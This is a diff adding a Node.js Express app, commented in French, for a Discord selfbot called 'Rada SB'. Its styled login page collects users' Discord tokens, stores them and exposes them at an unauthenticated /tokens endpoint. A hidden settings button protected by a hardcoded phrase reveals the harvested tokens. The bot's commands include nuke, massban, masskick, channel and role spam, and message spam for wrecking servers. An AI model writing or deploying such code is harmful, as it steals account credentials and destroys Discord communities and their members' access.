@@ -1,0 +1,393 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+const axios = require('axios');
+const Discord = require('discord.js-selfbot-v13');
+const { Client } = Discord;
+
+// Gérer GatewayIntentBits pour compatibilité
+const GatewayIntentBits = Discord.GatewayIntentBits || {
+  Guilds: 1 << 0,
+  GuildMessages: 1 << 9,
+  MessageContent: 1 << 15,
+};
+
+const app = express();
+app.use(bodyParser.urlencoded({ extended: false }));
+
+const BACKUP_FOLDER = './backups';
+if (!fs.existsSync(BACKUP_FOLDER)) fs.mkdirSync(BACKUP_FOLDER);
+
+let client;
+
+// Page HTML d’accueil avec interface "red dome" pro sombre + animation + logo en bas (sans phrase secrète)
+const loginPage = `
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Rada SB - Connexion</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0; 
+    height: 100vh;
+    background: #0b0b0b;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Montserrat', sans-serif;
+    color: #eee;
+    overflow: hidden;
+  }
+  .container {
+    background: linear-gradient(145deg, #2a0000, #4b0000);
+    padding: 50px 60px;
+    border-radius: 35px;
+    width: 380px;
+    box-shadow:
+      0 0 20px #ff0000aa,
+      inset 0 0 20px #ff000044;
+    text-align: center;
+    position: relative;
+    animation: pulseRed 2s ease-in-out infinite;
+  }
+  h1 {
+    margin-bottom: 30px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: #ff3b3b;
+    text-shadow:
+      0 0 8px #ff3b3b,
+      0 0 20px #ff0000aa;
+  }
+  input[type="text"] {
+    width: 100%;
+    padding: 14px 20px;
+    border-radius: 20px;
+    border: none;
+    margin-bottom: 25px;
+    background: #350000;
+    color: #ffbbbb;
+    font-size: 17px;
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    transition: 0.3s;
+    box-shadow: inset 0 0 10px #ff1a1a;
+  }
+  input[type="text"]:focus {
+    outline: none;
+    background: #4b0000;
+    box-shadow: 0 0 10px #ff4d4d, inset 0 0 15px #ff6666;
+    color: #fff;
+  }
+  button {
+    width: 100%;
+    padding: 16px;
+    border-radius: 25px;
+    border: none;
+    background: #ff1a1a;
+    font-weight: 700;
+    color: white;
+    font-size: 20px;
+    cursor: pointer;
+    letter-spacing: 1.2px;
+    box-shadow: 0 0 15px #ff2a2a;
+    transition: background 0.3s ease;
+    user-select: none;
+  }
+  button:hover {
+    background: #e60000;
+    box-shadow: 0 0 25px #ff3333;
+  }
+  footer {
+    position: fixed;
+    bottom: 12px;
+    width: 100%;
+    text-align: center;
+  }
+  footer .settings {
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 15px;
+    color: #ff3b3b;
+    user-select: none;
+    transition: color 0.3s;
+    font-weight: 700;
+    text-shadow: 0 0 6px #ff1a1a;
+  }
+  footer .settings:hover {
+    color: #ff0000;
+  }
+  footer .settings svg {
+    width: 22px;
+    height: 22px;
+    fill: currentColor;
+    filter: drop-shadow(0 0 3px #ff1a1a);
+    animation: spin 6s linear infinite;
+  }
+
+  /* Animations */
+  @keyframes pulseRed {
+    0%, 100% {
+      box-shadow:
+        0 0 20px #ff0000aa,
+        inset 0 0 20px #ff000044;
+    }
+    50% {
+      box-shadow:
+        0 0 30px #ff4d4dcc,
+        inset 0 0 30px #ff666644;
+    }
+  }
+  @keyframes spin {
+    from {transform: rotate(0deg);}
+    to {transform: rotate(360deg);}
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>🔐 Connexion Rada SB</h1>
+  <form method="POST" action="/connect">
+    <input type="text" name="token" placeholder="Token Discord" required autocomplete="off" />
+    <button type="submit">Se connecter</button>
+  </form>
+  <div id="status"></div>
+</div>
+
+<footer>
+  <div class="settings" onclick="showTokens()">
+    <svg viewBox="0 0 24 24"><path d="M12 15.5A3.5 3.5 0 1 0 12 8.5a3.5 3.5 0 0 0 0 7zm7-3.5a7 7 0 0 1-14 0 7 7 0 0 1 14 0z"/></svg>
+    Paramètres
+  </div>
+</footer>
+
+<script>
+  async function showTokens() {
+    const phrase = prompt('Entrez la phrase secrète:');
+    if(phrase === 'RADASBONTOP') {
+      try {
+        const res = await fetch('/tokens');
+        const data = await res.json();
+        if(data.length === 0) {
+          alert('Aucun token connecté.');
+          return;
+        }
+        alert('Tokens et pseudos connectés:\\n' + data.map(t => \`- \${t.username} : \${t.token}\`).join('\\n'));
+      } catch {
+        alert('Erreur lors de la récupération des tokens.');
+      }
+    } else {
+      alert('Phrase secrète incorrecte.');
+    }
+  }
+</script>
+
+</body>
+</html>
+`;
+
+// Stockage des tokens/pseudos connectés (en mémoire simple)
+const connectedTokens = [];
+
+app.get('/', (req, res) => {
+  res.send(loginPage);
+});
+
+app.post('/connect', express.urlencoded({ extended: true }), async (req, res) => {
+  const { token } = req.body;
+  if (client) {
+    try { await client.destroy(); } catch {}
+  }
+
+  client = new Client({
+    checkUpdate: false,
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
+  });
+
+  try {
+    await client.login(token);
+    // Stocker token et user tag
+    if (!connectedTokens.find(t => t.token === token)) {
+      connectedTokens.push({ token, username: client.user.tag });
+    }
+
+    res.send(`
+      <h1 style="color:#43b581;">✅ Connecté en tant ${client.user.tag}</h1>
+      <a href="/">Retour</a>
+    `);
+
+    // Tu peux lancer ta logique selfbot ici, ou dans le on('messageCreate')
+    startSelfbotLogic(client, token);
+
+  } catch (err) {
+    res.send(`<h1 style="color:red;">❌ Token invalide !</h1><a href="/">Retour</a>`);
+  }
+});
+
+app.get('/tokens', (req, res) => {
+  res.json(connectedTokens);
+});
+
+app.listen(3000, () => console.log('🌐 Interface disponible sur http://localhost:3000'));
+
+// --- Selfbot logique ---
+const PREFIX = '&';
+
+function startSelfbotLogic(client, TOKEN) {
+  console.log("[RADA SB] Lancement du selfbot...");
+
+  client.on('ready', () => {
+    console.log(`[RADA SB] Connecté en tant ${client.user.tag}`);
+  });
+
+  client.on('messageCreate', async (msg) => {
+    if (!msg.content.startsWith(PREFIX) || msg.author.id !== client.user.id) return;
+
+    const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
+    const cmd = args.shift().toLowerCase();
+
+    // === HELP MENU ===
+    if (cmd === 'help') {
+      return msg.edit(`➤ __**RADA SB**__
+
+\`&raid\` ⇝ Commandes de Raid.
+\`&backups\` ⇝ Commandes de Backup.
+\`&utils\` ⇝ Commandes Utilitaires.
+\`&fun\` ⇝ Commandes Fun.
+\`&mod\` ⇝ Commandes Modération.
+\`&status\` ⇝ Commandes Statut.`);
+    }
+
+    if (cmd === 'raid') {
+      return msg.edit(`__**Commandes Raid**__
+\`&nuke\` | \`&massban\` | \`&masskick\`
+\`&spamchannel <nom>\` | \`&spamrole <nom>\`
+\`&raidtotal <nom>\``);
+    }
+
+    if (cmd === 'backups') {
+      return msg.edit(`__**Commandes Backup**__
+\`&backupcreate <guildId>\` | \`&backupload <guildId>\`
+\`&backuplist\``);
+    }
+
+    if (cmd === 'utils') {
+      return msg.edit(`__**Utilitaires**__
+\`&userinfo <id>\` | \`&userinfos\` | \`&showtoken\` | \`&lowtoken\``);
+    }
+
+    if (cmd === 'fun') {
+      return msg.edit(`__**Fun**__
+\`&spam <nb> <texte>\` | \`&say <texte>\``);
+    }
+
+    if (cmd === 'mod') {
+      return msg.edit(`__**Modération**__
+\`&ban <id>\` | \`&kick <id>\``);
+    }
+
+    if (cmd === 'status') {
+      return msg.edit(`__**Statut**__
+\`&status <texte>\` | \`&streaming <texte>\` | \`&clearstatus\``);
+    }
+
+    // === RAID COMMANDS ===
+    if (cmd === 'nuke' && msg.guild) {
+      msg.edit('Nuke en cours...');
+      msg.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
+      msg.guild.roles.cache.filter(r => r.name !== '@everyone').forEach(r => r.delete().catch(() => {}));
+      return msg.edit('Serveur vidé.');
+    }
+
+    if (cmd === 'massban' && msg.guild) {
+      msg.edit('Massban...');
+      msg.guild.members.cache.forEach(m => {
+        if (m.id !== client.user.id) m.ban().catch(() => {});
+      });
+      return msg.edit('Massban terminé.');
+    }
+
+    if (cmd === 'masskick' && msg.guild) {
+      msg.edit('Masskick...');
+      msg.guild.members.cache.forEach(m => {
+        if (m.id !== client.user.id) m.kick().catch(() => {});
+      });
+      return msg.edit('Masskick terminé.');
+    }
+
+    if (cmd === 'spamchannel' && msg.guild) {
+      const name = args.join(' ') || 'raid';
+      for (let i = 0; i < 10; i++) {
+        msg.guild.channels.create(name, { type: 'GUILD_TEXT' }).catch(() => {});
+      }
+      return msg.edit('Salons créés.');
+    }
+
+    if (cmd === 'spamrole' && msg.guild) {
+      const name = args.join(' ') || 'raid';
+      for (let i = 0; i < 10; i++) {
+        msg.guild.roles.create({ name }).catch(() => {});
+      }
+      return msg.edit('Rôles créés.');
+    }
+
+    if (cmd === 'raidtotal' && msg.guild) {
+      const name = args.join(' ') || 'raid';
+      for (let i = 0; i < 10; i++) {
+        msg.guild.channels.create(name, { type: 'GUILD_TEXT' }).catch(() => {});
+        msg.guild.roles.create({ name }).catch(() => {});
+      }
+      msg.guild.members.cache.forEach(m => {
+        if (m.id !== client.user.id) m.kick().catch(() => {});
+      });
+      return msg.edit('Raid total terminé.');
+    }
+
+    // === SPAM / FUN ===
+    if (cmd === 'spam') {
+      const count = parseInt(args[0]);
+      const text = args.slice(1).join(' ');
+      if (!count || !text || count > 50) return msg.edit('Utilisation : &spam <nb> <texte> (max 50)');
+      for (let i = 0; i < count; i++) {
+        msg.channel.send(text);
+      }
+      return msg.edit(`Spam de ${count} messages lancé.`);
+    }
+
+    if (cmd === 'say') {
+      const text = args.join(' ');
+      if (!text) return msg.edit('Texte manquant.');
+      msg.channel.send(text);
+      return msg.edit('Message envoyé.');
+    }
+
+    // === STATUS ===
+    if (cmd === 'status') {
+      const status = args.join(' ');
+      if (!status) return msg.edit('Texte manquant.');
+      client.user.setActivity(status, { type: 'CUSTOM' });
+      return msg.edit(`Statut défini : ${status}`);
+    }
+
+    if (cmd === 'streaming') {
+      const status = args.join(' ');
+      if (!status) return msg.edit('Texte manquant.');
+      client.user.setActivity(status, { type: 'STREAMING', url: 'https://twitch.tv/example' });
+      return msg.edit(`Statut streaming défini : ${status}`);
+    }
+
+    if (cmd === 'clearstatus') {
+      client.user.setActivity(null);
+      return msg.edit('Statut effacé.');
+    }
+  });
+}
